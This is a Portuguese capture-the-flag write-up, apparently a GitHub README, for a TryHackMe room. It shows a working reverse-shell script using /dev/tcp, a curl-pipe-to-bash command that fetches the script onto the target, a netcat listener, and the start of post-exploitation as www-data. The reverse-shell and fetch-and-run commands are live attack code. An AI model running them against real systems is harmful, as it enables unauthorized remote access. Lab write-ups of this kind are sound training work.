# 🛡️ Exploração da Máquina — 0ff3ns!v3 S3cur!ty - Sw4gg3r

## 🔗 Links

- 💻 **Máquina:** [Google Drive - Máquina](https://drive.google.com/file/d/1XsuWUulDDdktnV6fpPgRIH172iASvVmz/view)
- 🔍 **Prova:** [TryHackMe - 0ff3ns!v3 S3cur!ty - Sw4gg3r](https://tryhackme.com/room/0ff3nsv3s3curtysw4gg3r)

---

## ⚠️ Obs: Desligar o antivírus

### 💡 A máquina parece ter o `curl`. Dá pra subir um arquivo shell usando um servidor Python, baixar com `curl`, executar e escutar a resposta do outro lado.

![image](https://github.com/user-attachments/assets/9de29dba-6b94-4492-9d84-54b28b5408e3)

### 📄 Conteúdo do arquivo `shell_2.sh`:

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.100.168/4444 0>&1
```

### 🚀 Dentro dessa pasta, vamos subir o servidor Python para baixar com o curl:

![image](https://github.com/user-attachments/assets/ce117679-c08a-4e7b-90c8-79057e4d97db)

---

### 🌐 No site, usamos o comando `curl` para baixar o arquivo e em seguida já executá-lo:

```bash
curl http://[IP]:[PORTA]/shell_2.sh | bash
```

![image](https://github.com/user-attachments/assets/c0bba9e9-88df-4021-b2c9-9c3276935111)

### Confirmação : ::ffff:192.168.100.207 - - [21/May/2025 02:49:03] "GET /shell_2.sh HTTP/1.1" 200

### 📡 Em outro terminal, deixamos o listener pronto com:

```bash
nc -nlvp 4444
```

![image](https://github.com/user-attachments/assets/c3e6ad67-6e91-4442-a4e9-6196b32a58e2)

---

### ✅ Shell recebido! Agora é hora de fazer pós-exploração e escalar privilégios.

#### Acesso à máquina com usuário `www-data`:

---

### 🗂️ Aqui estão todos os arquivos encontrados com fuzzing. Agora vamos explorá-los em busca de algo útil.
![image](https://github.com/user-attachments/assets/a200a374-0976-4250-b338-69ea9889edbb)
### Após a exploração encontrei um arquivo .sh (O arquivo sensivel),
### Dentro da pasta `/opt`, encontramos um script `.sh` Arquivo executavel por todos:

![image](https://github.com/user-attachments/assets/854a11c4-a51e-4e55-85b3-e3faf37ec0c1)

### 🔍 Entendendo o que ocorre dentro do script:

![image](https://github.com/user-attachments/assets/a5f88153-c1f1-40fa-88f6-4e6f5c855d4d)

